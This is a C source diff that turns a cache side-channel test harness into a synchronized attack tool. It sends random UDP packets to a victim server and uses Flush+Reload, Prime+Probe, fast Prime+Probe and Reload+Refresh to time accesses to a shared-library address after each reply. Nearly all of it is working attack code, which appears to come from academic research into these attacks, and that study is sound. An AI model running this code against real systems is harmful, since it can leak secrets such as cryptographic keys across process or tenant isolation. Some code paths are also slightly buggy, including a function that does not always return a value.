@@ -4,7 +4,12 @@
 #include <unistd.h>
 #include <sys/mman.h>
 #include <sched.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 #include <sys/wait.h>
+#include <poll.h>
 #include <time.h>
 
 #include "T.h"           /*Shared library*/
@@ -23,13 +28,18 @@
 #endif
 
 #define TIME_LIMIT 190         /*Time for main memory access, must be calibrated*/
-#define CLEAN_REFRESH_TIME 620 /*Time for Refresh, must be calibrated*/
-#define TIME_PRIME 650         /*Time for Prime, must be calibrated*/
+#define CLEAN_REFRESH_TIME 550 /*Time for refresh, must be calibrated*/
+#define TIME_PRIME 650         /*Time for prime, must be calibrated*/
 #define NUM_CANDIDATES 3 * CACHE_SET_SIZE *CACHE_SLICES
 #define RES_MEM (1UL * 1024 * 1024) * 4 * CACHE_SIZE
 
 #define CLEAN_NOISE 1
 #define WAIT_FIXED 1
+
+/*Values for this approach*/
+#define NUM_SAMPLES 100000
+#define THRESHOLD 20000
+#define PACKET_SIZE 24
 
 int target_pos; //Should be the same in the sender
 long int *base_address;
@@ -45,11 +55,63 @@ int fd;
 FILE *out_fd;
 uintptr_t phys_addr;
 int slice, set;
-int wait_time;
-int max_run_time;
 int S, C, D;
 
-struct timespec request, remain;
+char packet[PACKET_SIZE * 2];
+char response[PACKET_SIZE];
+struct sockaddr_in server;
+int s;
+int num_samples;
+
+int send_packet(char packet[PACKET_SIZE])
+{
+    /*Generates random packet,flushes data, sends request, reloads data when response is received*/
+    int i;
+    struct pollfd p;
+
+    send(s, packet, PACKET_SIZE, 0);
+    p.fd = s;
+    p.events = POLLIN;
+    if (poll(&p, 1, 10) <= 0)
+        return;
+    while (p.revents & POLLIN)
+    {
+        if (recv(s, response, sizeof response, 0) == sizeof response)
+        {
+            if (!memcmp(packet, response, PACKET_SIZE - sizeof(uint64_t)))
+            {
+                return 1;
+            }
+            return 0;
+        }
+        if (poll(&p, 1, 0) <= 0)
+            break;
+    }
+}
+
+void check_dedup(long int *target_address)
+{
+    int i, t, res;
+    int cont = 0;
+    while (cont < 20)
+    {
+        //Random packet to send
+        for (i = 0; i < PACKET_SIZE - sizeof(uint64_t); ++i)
+            packet[i] = random();
+        *(unsigned long int *)(packet + PACKET_SIZE - sizeof(uint64_t)) = (uint64_t)(rand() % THRESHOLD);
+        t = access_timed_flush(target_address);
+        res = send_packet(packet);
+        lfence(); //Ensure the time is not read in advance
+        if (res > 0)
+        {
+            t = access_timed_flush(target_address);
+            if (t < TIME_LIMIT)
+            {
+                cont++;
+            }
+        }
+    }
+}
 
 int main(int argc, char **argv)
 {
@@ -58,27 +120,36 @@ int main(int argc, char **argv)
     //Just use first argument
     if (argc < 5)
     {
-        printf("Expected target address (int), attack name (-fr,-pp,-rr) wait cycles and max run time\n");
+        printf("Expected IP, target address (int), attack name (-fr,-pp,-fpp,-rr) and number of samples\n");
         return -1;
     }
-    else
+
+    if (!inet_aton(argv[1], &server.sin_addr))
+        return -1;
+    server.sin_family = AF_INET;
+    server.sin_port = htons(10000);
+
+    while ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
+        sleep(1);
+    while (connect(s, (struct sockaddr *)&server, sizeof server) == -1)
+        sleep(1);
+
+    target_pos = atoi(argv[2]);
+    num_samples = atoi(argv[4]);
+
+    if (!target_pos)
     {
-        target_pos = atoi(argv[1]);
-        wait_time = atoi(argv[3]);
-        max_run_time = atoi(argv[4]);
-        if (!target_pos)
-        {
-            printf("Error with the target address \n");
-            return -1;
-        }
-        target_address = (long int *)get_address_table(target_pos);
-        //target_address = (long int *)get_address_quixote(target_pos);
-        printf("Target address %lx %i %i\n", (long int)target_address, wait_time, max_run_time);
+        printf("Error with the target address \n");
+        return -1;
     }
-    if (strcmp(argv[2], "-fr") == 0)
+    target_address = (long int *)get_address_table(target_pos);
+    //target_address = (long int *)get_address_quixote(target_pos);
+    printf("Target address %lx \n", (long int)target_address);
+
+    if (strcmp(argv[3], "-fr") == 0)
     {
         printf("TEST FLUSH+RELOAD\n");
-        snprintf(file_name, 40, "test_fr_%d_%d.txt", target_pos, wait_time);
+        snprintf(file_name, 40, "test_fr_%d_sync.txt", target_pos);
         out_fd = fopen(file_name, "w");
         if (out_fd == NULL)
             fprintf(stderr, "Unable to open file\n");
@@ -86,40 +157,31 @@ int main(int argc, char **argv)
         unsigned long tim = timestamp();
         int cont = 0;
         /*Check deduplication*/
-        while (cont < 20)
-        {
-            tim = timestamp();
-            while (timestamp() < tim + wait_time)
-                ;
-            t = access_timed_flush(target_address);
-            //t = access_timed_full_flush(target_address);
-            if (t < (TIME_LIMIT - 50))
-            {
-                //printf("%i \n", t);
-                cont++;
-            }
-        }
+        check_dedup(target_address);
         printf("Ready \n");
-        clock_gettime(CLOCK_MONOTONIC, &request);
-        clock_gettime(CLOCK_MONOTONIC, &remain);
+        int j = 0;
         /*Carry the attack*/
-        while (remain.tv_sec < (request.tv_sec + max_run_time + 1))
+        while (j < num_samples)
         {
+            //Random packet to send
+            for (i = 0; i < PACKET_SIZE - sizeof(uint64_t); ++i)
+                packet[i] = random();
+            uint64_t ale = (uint64_t)(rand() % THRESHOLD);
+            *(unsigned long int *)(packet + PACKET_SIZE - sizeof(uint64_t)) = ale;
             t = access_timed_flush(target_address);
-            //t = access_timed_full_flush(target_address);
-            mfence();
-            tim = timestamp();
-#if WAIT_FIXED
-            while (timestamp() < tim + wait_time)
-                ;
-#endif
-            fprintf(out_fd, "%i %i %lu\n", t, 10, tim);
-            clock_gettime(CLOCK_MONOTONIC, &remain);
+
+            if (send_packet(packet) > 0)
+            {
+                t = access_timed_flush(target_address);
+                tim = timestamp();
+                fprintf(out_fd, "%i %i %lu\n", t, 10, tim);
+                j++;
+            }
         }
         fclose(out_fd);
         return 0;
     }
-    else if (!strcmp(argv[2], "-pp"))
+    else if (!strcmp(argv[3], "-pp"))
     {
         printf("TEST PRIME+PROBE\n");
         /*Reserve huge pages*/
@@ -150,11 +212,9 @@ int main(int argc, char **argv)
         }
 
         printf("Reserved hugepages at %lx \n", (long int)base_address);
-	uintptr_t phys_addr1;
-	int res = virt_to_phys(&phys_addr1, getpid(), (uintptr_t)target_address);
-	printf("%lx \n",phys_addr1);
+
         /*Output file*/
-        snprintf(file_name, 40, "test_pp_%d_%d.txt", target_pos, wait_time);
+        snprintf(file_name, 40, "test_pp_%d_sync.txt", target_pos);
         out_fd = fopen(file_name, "w");
         if (out_fd == NULL)
             fprintf(stderr, "Unable to open file\n");
@@ -165,22 +225,14 @@ int main(int argc, char **argv)
         initialize_sets(eviction_set, filtered_set, NUM_CANDIDATES, candidates_set, NUM_CANDIDATES, TIME_LIMIT);
         store_invariant_part(eviction_set, invariant_part);
 
-        int cont;
+        /*Check deduplication*/
+        check_dedup(target_address);
+        printf("Ready \n");
+        int j = 0;
         unsigned long tim = timestamp();
         int t;
-        /*It should profile the cache to get the set and slice, we do the trick of enforcing deduplication before the profiling*/
-        while (cont < 20)
-        {
-            tim = timestamp();
-            while (timestamp() < tim + wait_time)
-                ;
-            t = access_timed_flush(target_address);
-            if (t < (TIME_LIMIT - 50))
-            {
-                cont++;
-            }
-        }
-        profile_address(invariant_part, eviction_set, target_address, &set, &slice);
+
+        profile_address(invariant_part, eviction_set, target_address, &set, &slice); //Tricky
         printf("Set and Slice %i %i \n", set, slice);
 
         /*Create the eviction set that matches with the target*/
@@ -188,20 +240,24 @@ int main(int argc, char **argv)
         write_linked_list(eviction_set);
         long int *prime_address = (long int *)eviction_set[slice * CACHE_SET_SIZE];
 
-        clock_gettime(CLOCK_MONOTONIC, &request);
-        clock_gettime(CLOCK_MONOTONIC, &remain);
         /*Carry the attack*/
-        while (remain.tv_sec < (request.tv_sec + max_run_time + 1))
+        while (j < num_samples)
         {
+            //Random packet to send
+            for (i = 0; i < PACKET_SIZE - sizeof(uint64_t); ++i)
+                packet[i] = random();
+            *(unsigned long int *)(packet + PACKET_SIZE - sizeof(uint64_t)) = (uint64_t)(rand() % THRESHOLD);
             t = probe_one_set(prime_address);
             mfence();
-            tim = timestamp();
-#if WAIT_FIXED
-            while (timestamp() < tim + wait_time)
-                ;
-#endif
-            fprintf(out_fd, "%i %i %lu\n", t, 10, tim);
-            clock_gettime(CLOCK_MONOTONIC, &remain);
+
+            if (send_packet(packet) > 0)
+            {
+                lfence();
+                t = probe_one_set(prime_address);
+                tim = timestamp();
+                fprintf(out_fd, "%i %i %lu\n", t, 10, tim);
+                j++;
+            }
         }
         fclose(out_fd);
         /*Release huge pages*/
@@ -209,7 +265,7 @@ int main(int argc, char **argv)
         unlink(FILE_NAME);
         return 0;
     }
-    else if (!strcmp(argv[2], "-fpp")) //For fast Prime+Probe test
+    else if (!strcmp(argv[3], "-fpp")) //For fast Prime+Probe test
     {
         if (argc < 7)
         {
@@ -220,7 +276,7 @@ int main(int argc, char **argv)
         C = atoi(argv[6]);
         D = atoi(argv[7]);
         printf("TEST FAST PRIME+PROBE (Rowhammer.js)\n");
-        snprintf(file_name, 40, "test_fpp_%d_%d.txt", target_pos, wait_time);
+        snprintf(file_name, 40, "test_fpp_%d_sync.txt", target_pos);
         out_fd = fopen(file_name, "w");
         if (out_fd == NULL)
             fprintf(stderr, "Unable to open file\n");
@@ -245,6 +301,11 @@ int main(int argc, char **argv)
             perror("mmap");
             unlink(FILE_NAME);
             exit(1);
+        }
+        long int mem;
+        for (mem = 0; mem < ((reserved_size) / 8); ++mem)
+        {
+            *(base_address + mem) = mem;
         }
 
         /*Set generation*/
@@ -253,53 +314,51 @@ int main(int argc, char **argv)
         initialize_sets(eviction_set, filtered_set, NUM_CANDIDATES, candidates_set, NUM_CANDIDATES, TIME_LIMIT);
         store_invariant_part(eviction_set, invariant_part);
 
-        int cont;
-        unsigned long tim = timestamp();
+        /*Check deduplication*/
+        check_dedup(target_address);
+        printf("Ready \n");
+        int j = 0;
         int t;
-        /*It should profile the cache to get the set and slice, we do the trick of enforcing deduplication before the profiling*/
-        while (cont < 20)
-        {
-            tim = timestamp();
-            while (timestamp() < tim + wait_time)
-                ;
-            t = access_timed_flush(target_address);
-            if (t < (TIME_LIMIT - 50))
-            {
-                cont++;
-            }
-        }
-        profile_address(invariant_part, eviction_set, target_address, &set, &slice);
+        unsigned long tim = timestamp();
+
+        profile_address(invariant_part, eviction_set, target_address, &set, &slice); //Trick
         printf("Set and Slice %i %i \n", set, slice);
 
         /*Create the eviction set that matches with the target*/
         generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES, set); //To increase the size of the eviction set
         generate_new_eviction_set(set, invariant_part, eviction_set);
-        increase_eviction(candidates_set, NUM_CANDIDATES, eviction_set, long_eviction_set, slice, TIME_LIMIT);
+        increase_eviction(candidates_set, NUM_CANDIDATES, eviction_set, long_eviction_set, slice, TIME_LIMIT); //Specific for this variant
 
-        clock_gettime(CLOCK_MONOTONIC, &request);
-        clock_gettime(CLOCK_MONOTONIC, &remain);
         /*Carry the attack*/
-        while (remain.tv_sec < (request.tv_sec + max_run_time + 1))
+        while (j < num_samples)
         {
+            //Random packet to send
+            for (i = 0; i < PACKET_SIZE - sizeof(uint64_t); ++i)
+                packet[i] = random();
+            *(unsigned long int *)(packet + PACKET_SIZE - sizeof(uint64_t)) = (uint64_t)(rand() % THRESHOLD);
             t = fast_prime(long_eviction_set, S, C, D);
-            tim = timestamp();
-#if WAIT_FIXED
-            while (timestamp() < tim + wait_time)
-                ;
-#endif
-            fprintf(out_fd, "%i %i %lu\n", t, 10, tim);
-            clock_gettime(CLOCK_MONOTONIC, &remain);
+            mfence();
+
+            if (send_packet(packet) > 0)
+            {
+                lfence();
+                t = fast_prime(long_eviction_set, S, C, D);
+                tim = timestamp();
+                fprintf(out_fd, "%i %i %lu\n", t, 10, tim);
+                j++;
+            }
         }
+
         fclose(out_fd);
         /*Release huge pages*/
         close(fd);
         unlink(FILE_NAME);
         return 0;
     }
-    else if (!strcmp(argv[2], "-rr"))
+    else if (!strcmp(argv[3], "-rr"))
     {
         printf("TEST RELOAD+REFRESH\n");
-        snprintf(file_name, 40, "test_rr_%d_%d.txt", target_pos, wait_time);
+        snprintf(file_name, 40, "test_rr_%d_sync.txt", target_pos);
         out_fd = fopen(file_name, "w");
         if (out_fd == NULL)
             fprintf(stderr, "Unable to open file\n");
@@ -326,33 +385,31 @@ int main(int argc, char **argv)
             exit(1);
         }
 
+        long int mem;
+        for (mem = 0; mem < ((reserved_size) / 8); ++mem)
+        {
+            *(base_address + mem) = mem;
+        }
+
         /*Set generation*/
         int tar_set = 30 + (rand() % (SETS_PER_SLICE / 2)); //Avoid set 0 (noisy);
         generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES, tar_set);
         initialize_sets(eviction_set, filtered_set, NUM_CANDIDATES, candidates_set, NUM_CANDIDATES, TIME_LIMIT);
         store_invariant_part(eviction_set, invariant_part);
-        
+
+        /*Check deduplication*/
+        check_dedup(target_address);
+        printf("Ready \n");
+        int j = 0;
         int t, t1;
         unsigned long tim = timestamp();
-        int cont = 0;
-        while (cont < 20)
-        {
-            tim = timestamp();
-            while (timestamp() < tim + wait_time)
-                ;
-            t = access_timed_flush(target_address);
-            if (t < (TIME_LIMIT - 50))
-            {
-                cont++;
-            }
-        }
 
         profile_address(invariant_part, eviction_set, target_address, &set, &slice);
 
         /*Create the eviction set that matches with the target*/
         generate_new_eviction_set(set, invariant_part, eviction_set);
         write_linked_list(eviction_set);
-        get_elements_set_rr(elements_set, eviction_set, target_address, slice);
+        get_elements_set_rr(elements_set, eviction_set, target_address, slice); // For R+R
         long int *prime_address = (long int *)eviction_set[slice * CACHE_SET_SIZE];
         long int *first_el = (long int *)eviction_set[slice * CACHE_SET_SIZE];
         long int *conflict_address = (long int *)eviction_set[(slice + 1) * CACHE_SET_SIZE - 1];
@@ -375,28 +432,34 @@ int main(int argc, char **argv)
 
         /*Prepare the sets for the attack*/
         prepare_sets(elements_set, conflict_address, TIME_PRIME);
-        clock_gettime(CLOCK_MONOTONIC, &request);
-        clock_gettime(CLOCK_MONOTONIC, &remain);
+
         /*Carry the attack*/
-        while (remain.tv_sec < (request.tv_sec + max_run_time + 1))
+        int control = 0;
+        t1 = 0; // Refresh
+        while (j < num_samples)
         {
-            cont++;
-            t = reload_step(target_address, conflict_address, first_el);
-            lfence();
-            t1 = refresh_step((long int*)elements_set[2]);
-            tim = timestamp();
-#if WAIT_FIXED
-            while (timestamp() < tim + wait_time)
-                ;
-#endif
+            //Random packet to send
+            for (i = 0; i < PACKET_SIZE - sizeof(uint64_t); ++i)
+                packet[i] = random();
+            *(unsigned long int *)(packet + PACKET_SIZE - sizeof(uint64_t)) = (uint64_t)(rand() % THRESHOLD);
 #if CLEAN_NOISE
             if (t1 > CLEAN_REFRESH_TIME)
             {
                 prepare_sets(elements_set, conflict_address, TIME_PRIME);
             }
 #endif
-            fprintf(out_fd, "%i %i %lu\n", t, t1, tim);
-            clock_gettime(CLOCK_MONOTONIC, &remain);
+            mfence();
+            int res = send_packet(packet);
+            lfence();
+            t = reload_step(target_address, conflict_address, first_el);
+            lfence();
+            t1 = refresh_step((long int*)elements_set[2]);
+            tim = timestamp();
+            if (res > 0)
+            {
+                fprintf(out_fd, "%i %i %lu\n", t, t1, tim);
+                j++;
+            }
         }
         fclose(out_fd);
         /*Release huge pages*/
